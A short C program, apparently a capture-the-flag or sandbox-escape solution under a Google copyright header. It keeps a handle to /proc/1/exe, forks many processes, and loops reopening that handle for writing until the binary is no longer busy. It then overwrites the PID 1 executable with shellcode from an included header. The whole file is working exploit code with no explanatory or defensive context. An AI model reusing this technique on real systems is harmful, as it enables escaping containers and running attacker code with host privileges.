/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <err.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syscall.h>
#include <sys/mount.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#include "shellcode.h"

long check(long ret, const char *msg) {
  if (ret == -1) {
    err(1, "%s", msg);
  }
  return ret;
}

int main(int argc, char *argv[]) {
  puts("hello world");
  int fd = check(open("/proc/1/exe", O_PATH), "open(/proc/1/exe)");
  if (fd != 3) {
    errx(1, "fd != 3: %d", fd);
  }

  if(check(fork(), "fork")) {
    sleep(1);
    puts("bye");
    return 0;
  }

  for (int i = 0; i < 100; i++) {
    if(check(fork(), "fork") == 0) {
      break;
    }
  }

  check(chdir("/proc/self/fd"), "chdir(/proc/self)");

  while (1) {
    int fd = open("3", O_WRONLY);
    if (fd != -1) {
      puts("worked");
      write(fd, sc, sizeof(sc));
      puts("worked");
      return 0;
    }
    if (errno != ETXTBSY) {
      err(1, "open(3)");
    }
  }
}
